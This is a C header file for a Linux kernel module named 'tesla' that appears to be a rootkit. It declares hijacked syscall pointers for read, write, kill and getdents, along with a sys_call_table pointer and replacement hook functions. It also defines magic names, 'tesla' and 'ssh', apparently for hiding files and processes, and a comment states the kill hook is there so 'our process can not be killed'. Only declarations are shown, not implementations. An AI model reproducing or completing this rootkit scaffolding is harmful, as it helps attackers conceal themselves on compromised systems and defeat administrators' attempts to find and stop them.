/*
 * tesla.h -- function declaration and data structure definition.
 */

/* Due to some historical reason, 
 * this structure is not defined in any header file, 
 * but is rather defined in fs/readdir.c, 
 * and we need to re-define it here if we want to use it. 
 * What we do is just copy the one in fs/readdir.c and paste it here. 
 */

struct linux_dirent {
        unsigned long   d_ino;	/* Inode number */
        unsigned long   d_off;	/* Distance from the start of the directory to the start of the next linux_dirent */
        unsigned short  d_reclen;	/* Length of this linux_dirent */
        char            d_name[1];	/* Filename (null-terminated), variable width. */
};

asmlinkage long (*orig_read)(unsigned int, char __user *, size_t);
asmlinkage long (*orig_write)(unsigned int, const char __user *, size_t);
asmlinkage long (*orig_kill)(pid_t pid, int sig);
asmlinkage long (*orig_getdents)(unsigned int, struct linux_dirent __user *, unsigned int);

long **sys_call_table;

#define MAGIC_NAME "tesla"
#define MAGIC_PROC "ssh"

/* asmlinkage tells gcc that function parameters will not be in registers, but rather they will be in the stack. */

asmlinkage long tesla_read(unsigned int fd, char __user *buf, size_t count);
asmlinkage long tesla_write(unsigned int fd, char __user *buf, size_t count);
asmlinkage long tesla_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);

/* we need to intercept kill so that our process can not be killed */

asmlinkage long tesla_kill(pid_t pid, int sig);

/* vim: set ts=4: */
